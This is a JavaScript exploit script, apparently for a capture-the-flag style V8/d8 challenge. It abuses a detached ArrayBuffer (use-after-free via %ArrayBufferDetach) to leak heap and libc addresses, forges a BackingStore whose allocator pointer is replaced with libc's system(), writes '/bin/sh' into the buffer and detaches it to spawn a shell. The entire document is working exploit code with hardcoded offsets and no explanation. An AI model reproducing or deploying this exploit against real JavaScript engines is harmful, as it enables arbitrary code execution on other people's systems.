// ================================= LEAK HEAP
var arr1 = new ArrayBuffer(48);
var arr1_view1 = new Uint8Array(arr1);

%ArrayBufferDetach(arr1);

var arr2 = new ArrayBuffer(32);
var arr2_view1 = new Uint8Array(arr2);

var arr3 = new ArrayBuffer(64);
var arr3_view1 = new Uint8Array(arr3);
var arr3_view2 = new BigUint64Array(arr3);

arr3_view1.set(arr1_view1);

console.log("\n[ =================================== ]")
console.log('[*] buffer_start = 0x'+arr3_view2[0].toString(16));
console.log('[*] buffer_length = 0x'+arr3_view2[1].toString(16));
console.log('[*] buffer_capacity = 0x'+arr3_view2[2].toString(16));
console.log('[*] allocator = 0x'+arr3_view2[3].toString(16));

var HEAP_BASE = arr3_view2[0] - 0x28e90n; console.log("HEAP= "+HEAP_BASE.toString(16));

// ================================= LEAK LIBC
var arr4 = new ArrayBuffer(48);
var arr4_view1 = new Uint8Array(arr4);

%ArrayBufferDetach(arr4);

var arr5 = new ArrayBuffer(32);
var arr5_view1 = new Uint8Array(arr5);

var arr6 = new ArrayBuffer(8*10000);
var arr6_view1 = new Uint8Array(arr6);
var arr6_view2 = new BigUint64Array(arr6);

arr6_view1.set(arr4_view1);

console.log("\n[ =================================== ]")
console.log('[*] buffer_start = 0x'+arr6_view2[0].toString(16));
console.log('[*] buffer_length = 0x'+arr6_view2[1].toString(16));
console.log('[*] buffer_capacity = 0x'+arr6_view2[2].toString(16));
console.log('[*] allocator = 0x'+arr6_view2[3].toString(16));
console.log('[*] flags = 0x'+arr6_view2[5].toString(16));
// %SystemBreak();
// # 0x7ffff7f09000-0x7ffff310d000
// 0x7ffff7f09000-0x7ffff310d000
var LIBC_BASE = arr6_view2[0] - 0x4dfc000n;
console.log("[#] LIBC= "+LIBC_BASE.toString(16));
//%SystemBreak();

// ================================= OVERWRITE FUNCTION POINTER
var arr7 = new ArrayBuffer(48);
// %DebugPrint(arr7);
var arr7_view1 = new BigUint64Array(arr7);
var arr7_view2 = new Uint8Array(arr7);

var system = LIBC_BASE + 0x000000000004f4e0n;
//var system = LIBC_BASE + 0x10a45cn;
console.log("[+] system addr = 0x"+system.toString(16));
// %SystemBreak();

// construct fake BackingStore
arr7_view1[0] = arr6_view2[0];
arr7_view1[1] = arr6_view2[1];
arr7_view1[2] =  arr6_view2[2];
arr7_view1[3] = system;
arr7_view1[4] = arr6_view2[4];
arr7_view1[5] = BigInt(0x40) | arr6_view2[5];
arr7_view1[6] = arr6_view2[6];

arr4_view1.set(arr7_view2);
// %DebugPrint(arr6_view2);
// copy content from arr4 to check the values (optional step)
arr6_view1.set(arr4_view1);

console.log("\n[ =================================== ]")
console.log('[*] buffer_start = 0x'+arr6_view2[0].toString(16));
console.log('[*] buffer_length = 0x'+arr6_view2[1].toString(16));
console.log('[*] buffer_capacity = 0x'+arr6_view2[2].toString(16));
console.log('[*] allocator = 0x'+arr6_view2[3].toString(16));
console.log('[*] flags = 0x'+arr6_view2[5].toString(16));
//%SystemBreak();
///bin/ls
arr6_view1.set(Uint8Array.from("/bin/sh\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".split('').map(c => c.charCodeAt(0))));
// %DebugPrint(arr6_view1.buffer);

//%SystemBreak();
// trigger system()
%ArrayBufferDetach(arr6);
// Math.cosh(1);
// %SystemBreak();
